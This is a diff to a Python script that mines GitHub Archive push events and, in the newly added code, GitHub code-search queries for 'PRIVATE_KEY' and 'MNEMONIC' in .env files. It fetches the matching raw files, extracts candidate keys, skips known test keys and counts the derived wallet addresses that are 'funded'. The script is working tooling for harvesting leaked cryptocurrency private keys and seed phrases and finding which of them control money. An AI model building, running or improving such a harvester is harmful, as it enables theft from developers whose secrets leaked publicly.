@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 """
-DOT
-
+Dot
 """
 
 import os
@@ -56,12 +55,20 @@ MAX_ADDRESSES_PER_RUN = 300
 FETCH_WORKERS = 10
 CHECK_WORKERS = 6
 RUN_BUDGET_SEC = 780
+MIN_COMMITS_BEFORE_FALLBACK = 60
 
 ARCHIVE_HOSTS = [
     "https://gharchive.open-digger.net/",
     "https://data.gharchive.org/",
 ]
 ARCHIVE_OFFSETS = (2, 3)
+
+SEARCH_QUERIES = [
+    "PRIVATE_KEY= in:file",
+    "PRIVATE_KEY path:.env",
+    "PRIVATE_KEY path:env",
+    "MNEMONIC path:.env",
+]
 
 TEST_KEYS = {
     "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80",
@@ -110,7 +117,7 @@ def resolve_creds():
 
 # ---------------- HELPERS ----------------
 def load_state():
-    state = {"seen_addresses": [], "seen_shas": [], "q_offset": 0}
+    state = {"seen_addresses": [], "seen_shas": [], "seen_urls": [], "q_offset": 0}
     if os.path.exists(STATE_FILE):
         try:
             with open(STATE_FILE) as f:
@@ -119,16 +126,16 @@ def load_state():
                 state.update(loaded)
         except Exception:
             pass
-    if not isinstance(state.get("seen_addresses"), list):
-        state["seen_addresses"] = []
-    if not isinstance(state.get("seen_shas"), list):
-        state["seen_shas"] = []
+    for key in ("seen_addresses", "seen_shas", "seen_urls"):
+        if not isinstance(state.get(key), list):
+            state[key] = []
     return state
 
 
 def save_state(state):
     state["seen_addresses"] = state["seen_addresses"][-20000:]
     state["seen_shas"] = state["seen_shas"][-12000:]
+    state["seen_urls"] = state["seen_urls"][-8000:]
     with open(STATE_FILE, "w") as f:
         json.dump(state, f)
 
@@ -283,10 +290,12 @@ def collect_archive(seen_shas):
         if raw is None:
             continue
 
+        lines = raw.splitlines()
+        push_lines = [ln for ln in lines if "PushEvent" in ln]
+        log("[a] %s: %d lines, %d push events" % (name, len(lines), len(push_lines)))
+
         got = 0
-        for line in raw.splitlines():
-            if '"PushEvent"' not in line:
-                continue
+        for line in push_lines:
             try:
                 ev = json.loads(line)
             except Exception:
@@ -294,13 +303,21 @@ def collect_archive(seen_shas):
             repo = ev.get("repo", {}).get("name")
             if not repo:
                 continue
-            for c in (ev.get("payload", {}).get("commits") or [])[:2]:
-                sha = c.get("sha")
+            payload = ev.get("payload", {}) or {}
+
+            shas = [c.get("sha") for c in (payload.get("commits") or []) if c.get("sha")]
+            if not shas:
+                head = payload.get("head")
+                if head:
+                    shas = [head]
+
+            for sha in shas[:2]:
                 if sha and sha not in seen_shas:
                     commits.append((repo, sha))
                     got += 1
             if len(commits) >= MAX_COMMITS_PER_RUN:
                 break
+
         log("[a] %s: %d commits (total %d)" % (name, got, len(commits)))
 
     return commits
@@ -339,6 +356,36 @@ def collect_events(seen_shas):
     return commits
 
 
+# ---------------- SOURCE 3: SEARCH FILLER ----------------
+def collect_search(state, seen_urls):
+    out = []
+    offset = int(state.get("q_offset", 0) or 0)
+    query = SEARCH_QUERIES[offset % len(SEARCH_QUERIES)]
+    state["q_offset"] = (offset + 1) % len(SEARCH_QUERIES)
+    try:
+        r = requests.get(
+            "https://api.github.com/search/code",
+            params={"q": query, "sort": "indexed", "order": "desc", "per_page": 60},
+            headers=gh_headers(), timeout=30,
+        )
+        if r.status_code != 200:
+            log("[q] search status %d" % r.status_code)
+            return out
+        items = r.json().get("items", [])
+    except Exception as exc:
+        log("[q] search fail: " + str(exc)[:60])
+        return out
+
+    for item in items:
+        url = ("https://raw.githubusercontent.com/"
+               + item["repository"]["full_name"] + "/HEAD/" + item["path"])
+        if url in seen_urls:
+            continue
+        out.append(url)
+    log("[q] %d search files" % len(out))
+    return out
+
+
 # ---------------- FETCH ----------------
 def fetch_diff(item):
     repo, sha = item
@@ -352,6 +399,16 @@ def fetch_diff(item):
         return repo, sha, r.text[:500_000]
     except Exception:
         return repo, sha, ""
+
+
+def fetch_raw(url):
+    try:
+        r = requests.get(url, timeout=15)
+        if r.status_code != 200:
+            return url, ""
+        return url, r.text[:400_000]
+    except Exception:
+        return url, ""
 
 
 def check_address(args):
@@ -374,12 +431,11 @@ def main():
     state = load_state()
     seen = set(state["seen_addresses"])
     seen_shas = set(state["seen_shas"])
+    seen_urls = set(state["seen_urls"])
 
     commits = collect_archive(seen_shas)
-    if len(commits) < 40:
+    if len(commits) < MIN_COMMITS_BEFORE_FALLBACK:
         commits += collect_events(seen_shas)
-    else:
-        log("[*] archive delivered enough, skipping live events")
 
     uniq, dedupe = [], set()
     for repo, sha in commits:
@@ -406,7 +462,18 @@ def main():
                 if body:
                     work.append((repo + "@" + sha[:8], body))
 
-    log("[*] %d diffs carry candidates" % len(work))
+    if len(work) < 20:
+        urls = collect_search(state, seen_urls)
+        if urls:
+            with ThreadPoolExecutor(max_workers=FETCH_WORKERS) as pool:
+                futs = [pool.submit(fetch_raw, u) for u in urls]
+                for fut in as_completed(futs):
+                    url, text = fut.result()
+                    seen_urls.add(url)
+                    if text:
+                        work.append((url.split("/HEAD/")[-1], text))
+
+    log("[*] %d diffs/files carry candidates" % len(work))
 
     jobs = []
     for label, text in work:
@@ -452,8 +519,9 @@ def main():
 
     state["seen_addresses"] = list(seen)
     state["seen_shas"] = list(seen_shas)
+    state["seen_urls"] = list(seen_urls)
     save_state(state)
-    log("[*] done, %d commits, %d diffs, %d addresses, %d funded"
+    log("[*] done, %d commits, %d files, %d addresses, %d funded"
         % (len(uniq), len(work), len(jobs), hits))
 
 
